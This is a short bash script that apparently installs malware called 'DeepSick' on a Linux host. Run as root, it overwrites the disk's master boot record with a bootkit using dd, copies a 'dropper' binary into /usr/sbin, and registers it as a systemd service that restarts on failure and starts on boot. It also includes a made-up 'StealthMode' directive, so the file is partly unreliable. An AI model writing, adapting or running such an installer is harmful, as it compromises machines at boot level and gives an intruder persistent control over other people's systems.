// placeholder
 #!/bin/bash

if [ "$EUID" -ne 0 ]; then
 echo "Run as root"
 exit 1
 fi

# Install bootkit
 dd if=build/bootkit/bootkit.bin of=/dev/sda bs=446 count=1 conv=notrunc

# Install dropper
 cp build/user/dropper /usr/sbin/deepsick_daemon
 chmod +x /usr/sbin/deepsick_daemon

# Create systemd service
 cat > /etc/systemd/system/deepsick.service <<EOF
 [Unit]
 Description=DeepSick Service
 After=network.target

[Service]
 ExecStart=/usr/sbin/deepsick_daemon
 Restart=always
 StealthMode=true

[Install]
 WantedBy=multi-user.target
 EOF

systemctl daemon-reload
 systemctl enable deepsick.service
 systemctl start deepsick.service

echo "[+] Deployment completed"
